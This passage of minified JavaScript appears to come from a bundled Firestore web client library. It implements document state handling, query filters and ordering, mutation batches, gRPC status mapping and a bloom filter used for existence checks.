Et(e,3,t,_e.min(),_e.min(),vn.empty(),2)}convertToFoundDocument(e,t){return!this.createTime.isEqual(_e.min())||this.documentType!==2&&this.documentType!==0||(this.createTime=e),this.version=e,this.documentType=1,this.data=t,this.documentState=0,this}convertToNoDocument(e){return this.version=e,this.documentType=2,this.data=vn.empty(),this.documentState=0,this}convertToUnknownDocument(e){return this.version=e,this.documentType=3,this.data=vn.empty(),this.documentState=2,this}setHasCommittedMutations(){return this.documentState=2,this}setHasLocalMutations(){return this.documentState=1,this.version=_e.min(),this}setReadTime(e){return this.readTime=e,this}get hasLocalMutations(){return this.documentState===1}get hasCommittedMutations(){return this.documentState===2}get hasPendingWrites(){return this.hasLocalMutations||this.hasCommittedMutations}isValidDocument(){return this.documentType!==0}isFoundDocument(){return this.documentType===1}isNoDocument(){return this.documentType===2}isUnknownDocument(){return this.documentType===3}isEqual(e){return e instanceof Et&&this.key.isEqual(e.key)&&this.version.isEqual(e.version)&&this.documentType===e.documentType&&this.documentState===e.documentState&&this.data.isEqual(e.data)}mutableCopy(){return new Et(this.key,this.documentType,this.version,this.readTime,this.createTime,this.data.clone(),this.documentState)}toString(){return`Document(${this.key}, ${this.version}, ${JSON.stringify(this.data.value)}, {createTime: ${this.createTime}}), {documentType: ${this.documentType}}), {documentState: ${this.documentState}})`}}class Rp{constructor(e,t){this.position=e,this.inclusive=t}}function kC(a,e,t){let o=0;for(let r=0;r<a.position.length;r++){const l=e[r],c=a.position[r];if(l.field.isKeyField()?o=Le.comparator(Le.fromName(c.referenceValue),t.key):o=ol(c,t.data.field(l.field)),l.dir==="desc"&&(o*=-1),o!==0)break}return o}function NC(a,e){if(a===null)return e===null;if(e===null||a.inclusive!==e.inclusive||a.position.length!==e.position.length)return!1;for(let t=0;t<a.position.length;t++)if(!Eo(a.position[t],e.position[t]))return!1;return!0}class Lp{constructor(e,t="asc"){this.field=e,this.dir=t}}function u2(a,e){return a.dir===e.dir&&a.field.isEqual(e.field)}class AT{}class Za extends AT{constructor(e,t,o){super(),this.field=e,this.op=t,this.value=o}static create(e,t,o){return e.isKeyField()?t==="in"||t==="not-in"?this.createKeyFieldInFilter(e,t,o):new p2(e,t,o):t==="array-contains"?new h2(e,o):t==="in"?new g2(e,o):t==="not-in"?new b2(e,o):t==="array-contains-any"?new v2(e,o):new Za(e,t,o)}static createKeyFieldInFilter(e,t,o){return t==="in"?new m2(e,o):new f2(e,o)}matches(e){const t=e.data.field(this.field);return this.op==="!="?t!==null&&t.nullValue===void 0&&this.matchesComparison(ol(t,this.value)):t!==null&&Xi(this.value)===Xi(t)&&this.matchesComparison(ol(t,this.value))}matchesComparison(e){switch(this.op){case"<":return e<0;case"<=":return e<=0;case"==":return e===0;case"!=":return e!==0;case">":return e>0;case">=":return e>=0;default:return we(47266,{operator:this.op})}}isInequality(){return["<","<=",">",">=","!=","not-in"].indexOf(this.op)>=0}getFlattenedFilters(){return[this]}getFilters(){return[this]}}class So extends AT{constructor(e,t){super(),this.filters=e,this.op=t,this.Pe=null}static create(e,t){return new So(e,t)}matches(e){return TT(this)?this.filters.find((t=>!t.matches(e)))===void 0:this.filters.find((t=>t.matches(e)))!==void 0}getFlattenedFilters(){return this.Pe!==null||(this.Pe=this.filters.reduce(((e,t)=>e.concat(t.getFlattenedFilters())),[])),this.Pe}getFilters(){return Object.assign([],this.filters)}}function TT(a){return a.op==="and"}function xT(a){return d2(a)&&TT(a)}function d2(a){for(const e of a.filters)if(e instanceof So)return!1;return!0}function Eg(a){if(a instanceof Za)return a.field.canonicalString()+a.op.toString()+il(a.value);if(xT(a))return a.filters.map((e=>Eg(e))).join(",");{const e=a.filters.map((t=>Eg(t))).join(",");return`${a.op}(${e})`}}function jT(a,e){return a instanceof Za?(function(o,r){return r instanceof Za&&o.op===r.op&&o.field.isEqual(r.field)&&Eo(o.value,r.value)})(a,e):a instanceof So?(function(o,r){return r instanceof So&&o.op===r.op&&o.filters.length===r.filters.length?o.filters.reduce(((l,c,d)=>l&&jT(c,r.filters[d])),!0):!1})(a,e):void we(19439)}function PT(a){return a instanceof Za?(function(t){return`${t.field.canonicalString()} ${t.op} ${il(t.value)}`})(a):a instanceof So?(function(t){return t.op.toString()+" {"+t.getFilters().map(PT).join(" ,")+"}"})(a):"Filter"}class p2 extends Za{constructor(e,t,o){super(e,t,o),this.key=Le.fromName(o.referenceValue)}matches(e){const t=Le.comparator(e.key,this.key);return this.matchesComparison(t)}}class m2 extends Za{constructor(e,t){super(e,"in",t),this.keys=qT("in",t)}matches(e){return this.keys.some((t=>t.isEqual(e.key)))}}class f2 extends Za{constructor(e,t){super(e,"not-in",t),this.keys=qT("not-in",t)}matches(e){return!this.keys.some((t=>t.isEqual(e.key)))}}function qT(a,e){return(e.arrayValue?.values||[]).map((t=>Le.fromName(t.referenceValue)))}class h2 extends Za{constructor(e,t){super(e,"array-contains",t)}matches(e){const t=e.data.field(this.field);return cb(t)&&Zc(t.arrayValue,this.value)}}class g2 extends Za{constructor(e,t){super(e,"in",t)}matches(e){const t=e.data.field(this.field);return t!==null&&Zc(this.value.arrayValue,t)}}class b2 extends Za{constructor(e,t){super(e,"not-in",t)}matches(e){if(Zc(this.value.arrayValue,{nullValue:"NULL_VALUE"}))return!1;const t=e.data.field(this.field);return t!==null&&t.nullValue===void 0&&!Zc(this.value.arrayValue,t)}}class v2 extends Za{constructor(e,t){super(e,"array-contains-any",t)}matches(e){const t=e.data.field(this.field);return!(!cb(t)||!t.arrayValue.values)&&t.arrayValue.values.some((o=>Zc(this.value.arrayValue,o)))}}class y2{constructor(e,t=null,o=[],r=[],l=null,c=null,d=null){this.path=e,this.collectionGroup=t,this.orderBy=o,this.filters=r,this.limit=l,this.startAt=c,this.endAt=d,this.Te=null}}function OC(a,e=null,t=[],o=[],r=null,l=null,c=null){return new y2(a,e,t,o,r,l,c)}function ub(a){const e=Ne(a);if(e.Te===null){let t=e.path.canonicalString();e.collectionGroup!==null&&(t+="|cg:"+e.collectionGroup),t+="|f:",t+=e.filters.map((o=>Eg(o))).join(","),t+="|ob:",t+=e.orderBy.map((o=>(function(l){return l.field.canonicalString()+l.dir})(o))).join(","),am(e.limit)||(t+="|l:",t+=e.limit),e.startAt&&(t+="|lb:",t+=e.startAt.inclusive?"b:":"a:",t+=e.startAt.position.map((o=>il(o))).join(",")),e.endAt&&(t+="|ub:",t+=e.endAt.inclusive?"a:":"b:",t+=e.endAt.position.map((o=>il(o))).join(",")),e.Te=t}return e.Te}function db(a,e){if(a.limit!==e.limit||a.orderBy.length!==e.orderBy.length)return!1;for(let t=0;t<a.orderBy.length;t++)if(!u2(a.orderBy[t],e.orderBy[t]))return!1;if(a.filters.length!==e.filters.length)return!1;for(let t=0;t<a.filters.length;t++)if(!jT(a.filters[t],e.filters[t]))return!1;return a.collectionGroup===e.collectionGroup&&!!a.path.isEqual(e.path)&&!!NC(a.startAt,e.startAt)&&NC(a.endAt,e.endAt)}function Sg(a){return Le.isDocumentKey(a.path)&&a.collectionGroup===null&&a.filters.length===0}class nm{constructor(e,t=null,o=[],r=[],l=null,c="F",d=null,f=null){this.path=e,this.collectionGroup=t,this.explicitOrderBy=o,this.filters=r,this.limit=l,this.limitType=c,this.startAt=d,this.endAt=f,this.Ie=null,this.Ee=null,this.Re=null,this.startAt,this.endAt}}function E2(a,e,t,o,r,l,c,d){return new nm(a,e,t,o,r,l,c,d)}function om(a){return new nm(a)}function zC(a){return a.filters.length===0&&a.limit===null&&a.startAt==null&&a.endAt==null&&(a.explicitOrderBy.length===0||a.explicitOrderBy.length===1&&a.explicitOrderBy[0].field.isKeyField())}function S2(a){return Le.isDocumentKey(a.path)&&a.collectionGroup===null&&a.filters.length===0}function C2(a){return a.collectionGroup!==null}function Bc(a){const e=Ne(a);if(e.Ie===null){e.Ie=[];const t=new Set;for(const l of e.explicitOrderBy)e.Ie.push(l),t.add(l.field.canonicalString());const o=e.explicitOrderBy.length>0?e.explicitOrderBy[e.explicitOrderBy.length-1].dir:"asc";(function(c){let d=new at(pt.comparator);return c.filters.forEach((f=>{f.getFlattenedFilters().forEach((p=>{p.isInequality()&&(d=d.add(p.field))}))})),d})(e).forEach((l=>{t.has(l.canonicalString())||l.isKeyField()||e.Ie.push(new Lp(l,o))})),t.has(pt.keyField().canonicalString())||e.Ie.push(new Lp(pt.keyField(),o))}return e.Ie}function go(a){const e=Ne(a);return e.Ee||(e.Ee=A2(e,Bc(a))),e.Ee}function A2(a,e){if(a.limitType==="F")return OC(a.path,a.collectionGroup,e,a.filters,a.limit,a.startAt,a.endAt);{e=e.map((r=>{const l=r.dir==="desc"?"asc":"desc";return new Lp(r.field,l)}));const t=a.endAt?new Rp(a.endAt.position,a.endAt.inclusive):null,o=a.startAt?new Rp(a.startAt.position,a.startAt.inclusive):null;return OC(a.path,a.collectionGroup,e,a.filters,a.limit,t,o)}}function Cg(a,e,t){return new nm(a.path,a.collectionGroup,a.explicitOrderBy.slice(),a.filters.slice(),e,t,a.startAt,a.endAt)}function im(a,e){return db(go(a),go(e))&&a.limitType===e.limitType}function RT(a){return`${ub(go(a))}|lt:${a.limitType}`}function Gs(a){return`Query(target=${(function(t){let o=t.path.canonicalString();return t.collectionGroup!==null&&(o+=" collectionGroup="+t.collectionGroup),t.filters.length>0&&(o+=`, filters: [${t.filters.map((r=>PT(r))).join(", ")}]`),am(t.limit)||(o+=", limit: "+t.limit),t.orderBy.length>0&&(o+=`, orderBy: [${t.orderBy.map((r=>(function(c){return`${c.field.canonicalString()} (${c.dir})`})(r))).join(", ")}]`),t.startAt&&(o+=", startAt: ",o+=t.startAt.inclusive?"b:":"a:",o+=t.startAt.position.map((r=>il(r))).join(",")),t.endAt&&(o+=", endAt: ",o+=t.endAt.inclusive?"a:":"b:",o+=t.endAt.position.map((r=>il(r))).join(",")),`Target(${o})`})(go(a))}; limitType=${a.limitType})`}function rm(a,e){return e.isFoundDocument()&&(function(o,r){const l=r.key.path;return o.collectionGroup!==null?r.key.hasCollectionId(o.collectionGroup)&&o.path.isPrefixOf(l):Le.isDocumentKey(o.path)?o.path.isEqual(l):o.path.isImmediateParentOf(l)})(a,e)&&(function(o,r){for(const l of Bc(o))if(!l.field.isKeyField()&&r.data.field(l.field)===null)return!1;return!0})(a,e)&&(function(o,r){for(const l of o.filters)if(!l.matches(r))return!1;return!0})(a,e)&&(function(o,r){return!(o.startAt&&!(function(c,d,f){const p=kC(c,d,f);return c.inclusive?p<=0:p<0})(o.startAt,Bc(o),r)||o.endAt&&!(function(c,d,f){const p=kC(c,d,f);return c.inclusive?p>=0:p>0})(o.endAt,Bc(o),r))})(a,e)}function T2(a){return a.collectionGroup||(a.path.length%2==1?a.path.lastSegment():a.path.get(a.path.length-2))}function LT(a){return(e,t)=>{let o=!1;for(const r of Bc(a)){const l=x2(r,e,t);if(l!==0)return l;o=o||r.field.isKeyField()}return 0}}function x2(a,e,t){const o=a.field.isKeyField()?Le.comparator(e.key,t.key):(function(l,c,d){const f=c.data.field(l),p=d.data.field(l);return f!==null&&p!==null?ol(f,p):we(42886)})(a.field,e,t);switch(a.dir){case"asc":return o;case"desc":return-1*o;default:return we(19790,{direction:a.dir})}}class Xr{constructor(e,t){this.mapKeyFn=e,this.equalsFn=t,this.inner={},this.innerSize=0}get(e){const t=this.mapKeyFn(e),o=this.inner[t];if(o!==void 0){for(const[r,l]of o)if(this.equalsFn(r,e))return l}}has(e){return this.get(e)!==void 0}set(e,t){const o=this.mapKeyFn(e),r=this.inner[o];if(r===void 0)return this.inner[o]=[[e,t]],void this.innerSize++;for(let l=0;l<r.length;l++)if(this.equalsFn(r[l][0],e))return void(r[l]=[e,t]);r.push([e,t]),this.innerSize++}delete(e){const t=this.mapKeyFn(e),o=this.inner[t];if(o===void 0)return!1;for(let r=0;r<o.length;r++)if(this.equalsFn(o[r][0],e))return o.length===1?delete this.inner[t]:o.splice(r,1),this.innerSize--,!0;return!1}forEach(e){Yr(this.inner,((t,o)=>{for(const[r,l]of o)e(r,l)}))}isEmpty(){return fT(this.inner)}size(){return this.innerSize}}const j2=new wa(Le.comparator);function ei(){return j2}const IT=new wa(Le.comparator);function kc(...a){let e=IT;for(const t of a)e=e.insert(t.key,t);return e}function DT(a){let e=IT;return a.forEach(((t,o)=>e=e.insert(t,o.overlayedDocument))),e}function zr(){return Vc()}function wT(){return Vc()}function Vc(){return new Xr((a=>a.toString()),((a,e)=>a.isEqual(e)))}const P2=new wa(Le.comparator),q2=new at(Le.comparator);function Xe(...a){let e=q2;for(const t of a)e=e.add(t);return e}const R2=new at(Ye);function L2(){return R2}function pb(a,e){if(a.useProto3Json){if(isNaN(e))return{doubleValue:"NaN"};if(e===1/0)return{doubleValue:"Infinity"};if(e===-1/0)return{doubleValue:"-Infinity"}}return{doubleValue:jp(e)?"-0":e}}function MT(a){return{integerValue:""+a}}function I2(a,e){return a2(e)?MT(e):pb(a,e)}class sm{constructor(){this._=void 0}}function D2(a,e,t){return a instanceof Ip?(function(r,l){const c={fields:{[bT]:{stringValue:gT},[yT]:{timestampValue:{seconds:r.seconds,nanos:r.nanoseconds}}}};return l&&lb(l)&&(l=tm(l)),l&&(c.fields[vT]=l),{mapValue:c}})(t,e):a instanceof eu?kT(a,e):a instanceof au?NT(a,e):(function(r,l){const c=_T(r,l),d=UC(c)+UC(r.Ae);return yg(c)&&yg(r.Ae)?MT(d):pb(r.serializer,d)})(a,e)}function w2(a,e,t){return a instanceof eu?kT(a,e):a instanceof au?NT(a,e):t}function _T(a,e){return a instanceof Dp?(function(o){return yg(o)||(function(l){return!!l&&"doubleValue"in l})(o)})(e)?e:{integerValue:0}:null}class Ip extends sm{}class eu extends sm{constructor(e){super(),this.elements=e}}function kT(a,e){const t=OT(e);for(const o of a.elements)t.some((r=>Eo(r,o)))||t.push(o);return{arrayValue:{values:t}}}class au extends sm{constructor(e){super(),this.elements=e}}function NT(a,e){let t=OT(e);for(const o of a.elements)t=t.filter((r=>!Eo(r,o)));return{arrayValue:{values:t}}}class Dp extends sm{constructor(e,t){super(),this.serializer=e,this.Ae=t}}function UC(a){return za(a.integerValue||a.doubleValue)}function OT(a){return cb(a)&&a.arrayValue.values?a.arrayValue.values.slice():[]}function M2(a,e){return a.field.isEqual(e.field)&&(function(o,r){return o instanceof eu&&r instanceof eu||o instanceof au&&r instanceof au?nl(o.elements,r.elements,Eo):o instanceof Dp&&r instanceof Dp?Eo(o.Ae,r.Ae):o instanceof Ip&&r instanceof Ip})(a.transform,e.transform)}class _2{constructor(e,t){this.version=e,this.transformResults=t}}class Ko{constructor(e,t){this.updateTime=e,this.exists=t}static none(){return new Ko}static exists(e){return new Ko(void 0,e)}static updateTime(e){return new Ko(e)}get isNone(){return this.updateTime===void 0&&this.exists===void 0}isEqual(e){return this.exists===e.exists&&(this.updateTime?!!e.updateTime&&this.updateTime.isEqual(e.updateTime):!e.updateTime)}}function mp(a,e){return a.updateTime!==void 0?e.isFoundDocument()&&e.version.isEqual(a.updateTime):a.exists===void 0||a.exists===e.isFoundDocument()}class lm{}function zT(a,e){if(!a.hasLocalMutations||e&&e.fields.length===0)return null;if(e===null)return a.isNoDocument()?new BT(a.key,Ko.none()):new pu(a.key,a.data,Ko.none());{const t=a.data,o=vn.empty();let r=new at(pt.comparator);for(let l of e.fields)if(!r.has(l)){let c=t.field(l);c===null&&l.length>1&&(l=l.popLast(),c=t.field(l)),c===null?o.delete(l):o.set(l,c),r=r.add(l)}return new Zr(a.key,o,new Mn(r.toArray()),Ko.none())}}function k2(a,e,t){a instanceof pu?(function(r,l,c){const d=r.value.clone(),f=VC(r.fieldTransforms,l,c.transformResults);d.setAll(f),l.convertToFoundDocument(c.version,d).setHasCommittedMutations()})(a,e,t):a instanceof Zr?(function(r,l,c){if(!mp(r.precondition,l))return void l.convertToUnknownDocument(c.version);const d=VC(r.fieldTransforms,l,c.transformResults),f=l.data;f.setAll(UT(r)),f.setAll(d),l.convertToFoundDocument(c.version,f).setHasCommittedMutations()})(a,e,t):(function(r,l,c){l.convertToNoDocument(c.version).setHasCommittedMutations()})(0,e,t)}function Fc(a,e,t,o){return a instanceof pu?(function(l,c,d,f){if(!mp(l.precondition,c))return d;const p=l.value.clone(),v=FC(l.fieldTransforms,f,c);return p.setAll(v),c.convertToFoundDocument(c.version,p).setHasLocalMutations(),null})(a,e,t,o):a instanceof Zr?(function(l,c,d,f){if(!mp(l.precondition,c))return d;const p=FC(l.fieldTransforms,f,c),v=c.data;return v.setAll(UT(l)),v.setAll(p),c.convertToFoundDocument(c.version,v).setHasLocalMutations(),d===null?null:d.unionWith(l.fieldMask.fields).unionWith(l.fieldTransforms.map((y=>y.field)))})(a,e,t,o):(function(l,c,d){return mp(l.precondition,c)?(c.convertToNoDocument(c.version).setHasLocalMutations(),null):d})(a,e,t)}function N2(a,e){let t=null;for(const o of a.fieldTransforms){const r=e.data.field(o.field),l=_T(o.transform,r||null);l!=null&&(t===null&&(t=vn.empty()),t.set(o.field,l))}return t||null}function BC(a,e){return a.type===e.type&&!!a.key.isEqual(e.key)&&!!a.precondition.isEqual(e.precondition)&&!!(function(o,r){return o===void 0&&r===void 0||!(!o||!r)&&nl(o,r,((l,c)=>M2(l,c)))})(a.fieldTransforms,e.fieldTransforms)&&(a.type===0?a.value.isEqual(e.value):a.type!==1||a.data.isEqual(e.data)&&a.fieldMask.isEqual(e.fieldMask))}class pu extends lm{constructor(e,t,o,r=[]){super(),this.key=e,this.value=t,this.precondition=o,this.fieldTransforms=r,this.type=0}getFieldMask(){return null}}class Zr extends lm{constructor(e,t,o,r,l=[]){super(),this.key=e,this.data=t,this.fieldMask=o,this.precondition=r,this.fieldTransforms=l,this.type=1}getFieldMask(){return this.fieldMask}}function UT(a){const e=new Map;return a.fieldMask.fields.forEach((t=>{if(!t.isEmpty()){const o=a.data.field(t);e.set(t,o)}})),e}function VC(a,e,t){const o=new Map;ma(a.length===t.length,32656,{Ve:t.length,de:a.length});for(let r=0;r<t.length;r++){const l=a[r],c=l.transform,d=e.data.field(l.field);o.set(l.field,w2(c,d,t[r]))}return o}function FC(a,e,t){const o=new Map;for(const r of a){const l=r.transform,c=t.data.field(r.field);o.set(r.field,D2(l,c,e))}return o}class BT extends lm{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=2,this.fieldTransforms=[]}getFieldMask(){return null}}class O2 extends lm{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=3,this.fieldTransforms=[]}getFieldMask(){return null}}class z2{constructor(e,t,o,r){this.batchId=e,this.localWriteTime=t,this.baseMutations=o,this.mutations=r}applyToRemoteDocument(e,t){const o=t.mutationResults;for(let r=0;r<this.mutations.length;r++){const l=this.mutations[r];l.key.isEqual(e.key)&&k2(l,e,o[r])}}applyToLocalView(e,t){for(const o of this.baseMutations)o.key.isEqual(e.key)&&(t=Fc(o,e,t,this.localWriteTime));for(const o of this.mutations)o.key.isEqual(e.key)&&(t=Fc(o,e,t,this.localWriteTime));return t}applyToLocalDocumentSet(e,t){const o=wT();return this.mutations.forEach((r=>{const l=e.get(r.key),c=l.overlayedDocument;let d=this.applyToLocalView(c,l.mutatedFields);d=t.has(r.key)?null:d;const f=zT(c,d);f!==null&&o.set(r.key,f),c.isValidDocument()||c.convertToNoDocument(_e.min())})),o}keys(){return this.mutations.reduce(((e,t)=>e.add(t.key)),Xe())}isEqual(e){return this.batchId===e.batchId&&nl(this.mutations,e.mutations,((t,o)=>BC(t,o)))&&nl(this.baseMutations,e.baseMutations,((t,o)=>BC(t,o)))}}class mb{constructor(e,t,o,r){this.batch=e,this.commitVersion=t,this.mutationResults=o,this.docVersions=r}static from(e,t,o){ma(e.mutations.length===o.length,58842,{me:e.mutations.length,fe:o.length});let r=(function(){return P2})();const l=e.mutations;for(let c=0;c<l.length;c++)r=r.insert(l[c].key,o[c].version);return new mb(e,t,o,r)}}class U2{constructor(e,t){this.largestBatchId=e,this.mutation=t}getKey(){return this.mutation.key}isEqual(e){return e!==null&&this.mutation===e.mutation}toString(){return`Overlay{
      largestBatchId: ${this.largestBatchId},
      mutation: ${this.mutation.toString()}
    }`}}class B2{constructor(e,t){this.count=e,this.unchangedNames=t}}var Ka,na;function V2(a){switch(a){case de.OK:return we(64938);case de.CANCELLED:case de.UNKNOWN:case de.DEADLINE_EXCEEDED:case de.RESOURCE_EXHAUSTED:case de.INTERNAL:case de.UNAVAILABLE:case de.UNAUTHENTICATED:return!1;case de.INVALID_ARGUMENT:case de.NOT_FOUND:case de.ALREADY_EXISTS:case de.PERMISSION_DENIED:case de.FAILED_PRECONDITION:case de.ABORTED:case de.OUT_OF_RANGE:case de.UNIMPLEMENTED:case de.DATA_LOSS:return!0;default:return we(15467,{code:a})}}function VT(a){if(a===void 0)return Zo("GRPC error has no .code"),de.UNKNOWN;switch(a){case Ka.OK:return de.OK;case Ka.CANCELLED:return de.CANCELLED;case Ka.UNKNOWN:return de.UNKNOWN;case Ka.DEADLINE_EXCEEDED:return de.DEADLINE_EXCEEDED;case Ka.RESOURCE_EXHAUSTED:return de.RESOURCE_EXHAUSTED;case Ka.INTERNAL:return de.INTERNAL;case Ka.UNAVAILABLE:return de.UNAVAILABLE;case Ka.UNAUTHENTICATED:return de.UNAUTHENTICATED;case Ka.INVALID_ARGUMENT:return de.INVALID_ARGUMENT;case Ka.NOT_FOUND:return de.NOT_FOUND;case Ka.ALREADY_EXISTS:return de.ALREADY_EXISTS;case Ka.PERMISSION_DENIED:return de.PERMISSION_DENIED;case Ka.FAILED_PRECONDITION:return de.FAILED_PRECONDITION;case Ka.ABORTED:return de.ABORTED;case Ka.OUT_OF_RANGE:return de.OUT_OF_RANGE;case Ka.UNIMPLEMENTED:return de.UNIMPLEMENTED;case Ka.DATA_LOSS:return de.DATA_LOSS;default:return we(39323,{code:a})}}(na=Ka||(Ka={}))[na.OK=0]="OK",na[na.CANCELLED=1]="CANCELLED",na[na.UNKNOWN=2]="UNKNOWN",na[na.INVALID_ARGUMENT=3]="INVALID_ARGUMENT",na[na.DEADLINE_EXCEEDED=4]="DEADLINE_EXCEEDED",na[na.NOT_FOUND=5]="NOT_FOUND",na[na.ALREADY_EXISTS=6]="ALREADY_EXISTS",na[na.PERMISSION_DENIED=7]="PERMISSION_DENIED",na[na.UNAUTHENTICATED=16]="UNAUTHENTICATED",na[na.RESOURCE_EXHAUSTED=8]="RESOURCE_EXHAUSTED",na[na.FAILED_PRECONDITION=9]="FAILED_PRECONDITION",na[na.ABORTED=10]="ABORTED",na[na.OUT_OF_RANGE=11]="OUT_OF_RANGE",na[na.UNIMPLEMENTED=12]="UNIMPLEMENTED",na[na.INTERNAL=13]="INTERNAL",na[na.UNAVAILABLE=14]="UNAVAILABLE",na[na.DATA_LOSS=15]="DATA_LOSS";function F2(){return new TextEncoder}const H2=new Ji([4294967295,4294967295],0);function HC(a){const e=F2().encode(a),t=new oT;return t.update(e),new Uint8Array(t.digest())}function GC(a){const e=new DataView(a.buffer),t=e.getUint32(0,!0),o=e.getUint32(4,!0),r=e.getUint32(8,!0),l=e.getUint32(12,!0);return[new Ji([t,o],0),new Ji([r,l],0)]}class fb{constructor(e,t,o){if(this.bitmap=e,this.padding=t,this.hashCount=o,t<0||t>=8)throw new Nc(`Invalid padding: ${t}`);if(o<0)throw new Nc(`Invalid hash count: ${o}`);if(e.length>0&&this.hashCount===0)throw new Nc(`Invalid hash count: ${o}`);if(e.length===0&&t!==0)throw new Nc(`Invalid padding when bitmap length is 0: ${t}`);this.ge=8*e.length-t,this.pe=Ji.fromNumber(this.ge)}ye(e,t,o){let r=e.add(t.multiply(Ji.fromNumber(o)));return r.compare(H2)===1&&(r=new Ji([r.getBits(0),r.getBits(1)],0)),r.modulo(this.pe).toNumber()}we(e){return!!(this.bitmap[Math.floor(e/8)]&1<<e%8)}mightContain(e){if(this.ge===0)return!1;const t=HC(e),[o,r]=GC(t);for(let l=0;l<this.hashCount;l++){const c=this.ye(o,r,l);if(!this.we(c))return!1}return!0}static create(e,t,o){const r=e%8==0?0:8-e%8,l=new Uint8Array(Math.ceil(e/8)),c=new fb(l,r,t);return o.forEach((d=>c.insert(d))),c}insert(e){if(this.ge===0)return;const t=HC(e),[o,r]=GC(t);for(let l=0;l<this.hashCount;l++){const c=this.ye(o,r,l);this.be(c)}}be(e){const t=Math.floor(e/8),o=e%8;this.bitmap[t]|=1<<o}}class Nc extends Error{constructor(){super(...arguments),this.name="BloomFilterError"}}class cm{constructor(e,t,o,r,l){this.snapshotVersion=e,this.targetChanges=t,this.targetMismatches=o,this.documentUpdates=r,this.resolvedLimboDocuments=l}static createSynthesizedRemoteEventForCurrentChange(e,t,o){const r=new Map;return r.set(e,mu.createSynthesizedTargetChangeForCurrentChange(e,t,o)),new cm(_e.min(),r,new wa(Ye),ei(),Xe())}}class mu{constructor(e,t,o,r,l){this.resumeToken=e,this.current=t,this.addedDocuments=o,this.modifiedDocuments=r,this.removedDocuments=l}static createSynthesizedTargetChangeForCurrentChange(e,t,o){return new mu(o,t,Xe(),Xe(),Xe())}}class fp{constructor(e,t,o,r){this.Se=e,this.removedTargetIds=t,this.key=o,this.De=r}}class FT{constructor(e,t){this.targetId=e,this.Ce=t}}class HT{constructor(e,t,o=ft.EMPTY_BYTE_STRING,r=null){this.state=e,this.targetIds=t,this.resumeToken=o,this.cause=r}}class JC{constructor(){this.ve=0,this.Fe=QC(),this.Me=ft.EMPTY_BYTE_STRING,this.xe=!1,this.Oe=!0}get current(){return this.xe}get resumeToken(){return this.Me}get Ne(){return this.ve!==0}get Be(){return this.Oe}Le(e){e.approximateByteSize()>0&&(this.Oe=!0,this.Me=e)}ke(){let e=Xe(),t=Xe(),o=Xe();return this.Fe.forEach(((r,l)=>{switch(l){case 0:e=e.add(r);break;case 2:t=t.add(r);break;case 1:o=o.add(r);break;default:we(38017,{changeType:l})}})),new mu(this.Me,this.xe,e,t,o)}Ke(){this.Oe=!1,this.Fe=QC()}qe(e,t){this.Oe=!0,this.Fe=this.Fe.insert(e,t)}Ue(e){this.Oe=!0,this.Fe=this.Fe.remove(e)}$e(){this.ve+=1}We(){this.ve-=1,ma(this.ve>=0,3241,{ve:this.ve})}Qe(){this.Oe=!0,this.xe=!0}}class G2{constructor(e){this.Ge=e,this.ze=new Map,this.je=ei(),this.He=Xd(),this.Je=Xd(),this.Ze=new wa(Ye)}Xe(e){for(const t of e.Se)e.De&&e.De.isFoundDocument()?this.Ye(t,e.De):this.et(t,e.key,e.De);for(const t of e.removedTargetIds)this.et(t,e.key,e.De)}tt(e){this.forEachTarget(e,(t=>{const o=this.nt(t);switch(e.state){case 0:this.rt(t)&&o.Le(e.resumeToken);break;case 1:o.We(),o.Ne||o.Ke(),o.Le(e.resumeToken);break;case 2:o.We(),o.Ne||this.removeTarget(t);break;case 3:this.rt(t)&&(o.Qe(),o.Le(e.resumeToken));break;case 4:this.rt(t)&&(this.it(t),o.Le(e.resumeToken));break;default:we(56790,{state:e.state})}}))}forEachTarget(e,t){e.targetIds.length>0?e.targetIds.forEach(t):this.ze.forEach(((o,r)=>{this.rt(r)&&t(r)}))}st(e){const t=e.targetId,o=e.Ce.count,r=this.ot(t);if(r){const l=r.target;if(Sg(l))if(o===0){const c=new Le(l.path);this.et(t,c,Et.newNoDocument(c,_e.min()))}else ma(o===1,20013,{expectedCount:o});else{const c=this._t(t);if(c!==o){const d=this.ut(e),f=d?this.ct(d,e,c):1;if(f!==0){this.it(t);const p=f===2?"TargetPurposeExistenceFilterMismatchBloom":"TargetPurposeExistenceFilterMismatch";this.Ze=this.Ze.insert(t,p)}}}}}ut(e){const t=e.Ce.unchangedNames;if(!t||!t.bits)return null;const{bits:{bitmap:o="",padding:r=0},hashCount:l=0}=t;let c,d;try{c=Yi(o).toUint8Array()}catch(f){if(f instanceof hT)return Jr("Decoding the base64 bloom filter in existence filter failed ("+f.message+"); ignoring the bloom filter and falling back to full re-query."),null;throw f}try{d=new fb(c,r,l)}catch(f){return Jr(f instanceof Nc?"BloomFilter error: ":"Applying bloom filter failed: ",f),null}return d.ge===0?null:d}ct(e,t,o){return t.Ce.count===o-this.Pt(e,t.targetId)?0:2}Pt(e,t){const o=this.Ge.getRemoteKeysForTarget(t);let r=0;return o.forEach((l=>{const c=this.Ge.ht(),d=`projects/${c.projectId}/databases/${c.database}/documents/${l.path.canonicalString()}`;e.mightContain(d)||(this.et(t,l,null),r++)})),r}Tt(e){const t=new Map;this.ze.forEach(((l,c)=>{const d=this.ot(c);if(d){if(l.current&&Sg(d.target)){const f=new Le(d.target.path);this.It(f).has(c)||this.Et(c,f)||this.et(c,f,Et.newNoDocument(f,e))}l.Be&&(t.set(c,l.ke()),l.Ke())}}));let o=Xe();this.Je.forEach(((l,c)=>{let d=!0;c.forEachWhile((f=>{const p=this.ot(f);return!p||p.purpose==="TargetPurposeLimboResolution"||(d=!1,!1)})),d&&(o=o.add(l))})),this.je.forEach(((l,c)=>c.setReadTime(e)));const r=new cm(e,t,this.Ze,this.je,o);return this.je=ei(),this.He=Xd(),this.Je=Xd(),this.Ze=new wa(Ye),r}Ye(e,t){if(!this.rt(e))return;const o=this.Et(e,t.key)?2:0;this.nt(e).qe(t.key,o),this.je=this.je.insert(t.key,t),this.He=this.He.insert(t.key,this.It(t.key).add(e)),this.Je=this.Je.insert(t.key,this.Rt(t.key).add(e))}et(e,t,o){if(!this.rt(e))return;const r=this.nt(e);this.Et(e,t)?r.qe(t,1):r.Ue(t),this.Je=this.Je.insert(t,this.Rt(t).delete(e)),this.Je=this.Je.insert(t,this.Rt(t).add(e)),o&&(this.je=this.je.insert(t,o))}removeTarget(e){this.ze.delete(e)}_t(e){const t=this.nt(e).ke();return 